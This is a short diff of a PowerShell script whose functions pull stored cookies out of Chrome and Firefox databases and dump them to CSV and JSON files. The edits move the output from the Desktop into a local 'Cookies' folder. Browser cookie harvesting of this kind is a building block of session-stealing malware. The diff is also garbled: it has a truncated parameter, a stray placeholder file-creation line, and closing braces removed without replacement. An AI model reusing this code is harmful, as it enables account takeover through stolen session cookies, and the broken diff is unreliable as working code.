@@ -26,7 +26,9 @@ function Get-ChromeCookies {
         }
         $reader.Close()
         $connection.Close()
-        $cookies | Export-Csv -Path "$($env:USERPROFILE)\Desktop\ChromeCookies.txt" -NoTypeInformation
+        $cookies | Export-Csv -Path "ChromeCookies.csv" -NoTypeInformation
+        New-Item -ItemType Directory -Force -Path "Cookies\Chrome"
+        $cookies | ConvertTo-Json | Out-File -FilePath "Cookies\Chrome\ChromeCookies.txt"
         return $cookies
     }
 }
@@ -62,7 +64,4 @@ function Get-FirefoxCookies {
             }
             $reader.Close()
             $connection.Close()
-        }
-    }
-    $cookies | Export-Csv -Path "$($env:USERPROFILE)\Desktop\FirefoxCookies.txt" -No
-New-Item -ItemType File -Path "C:\carpeta\nombre_archivo.ps1" -Value $null
+            $cookies | Export-Csv -Path "FirefoxCookies.csv" -NoTypeInformation
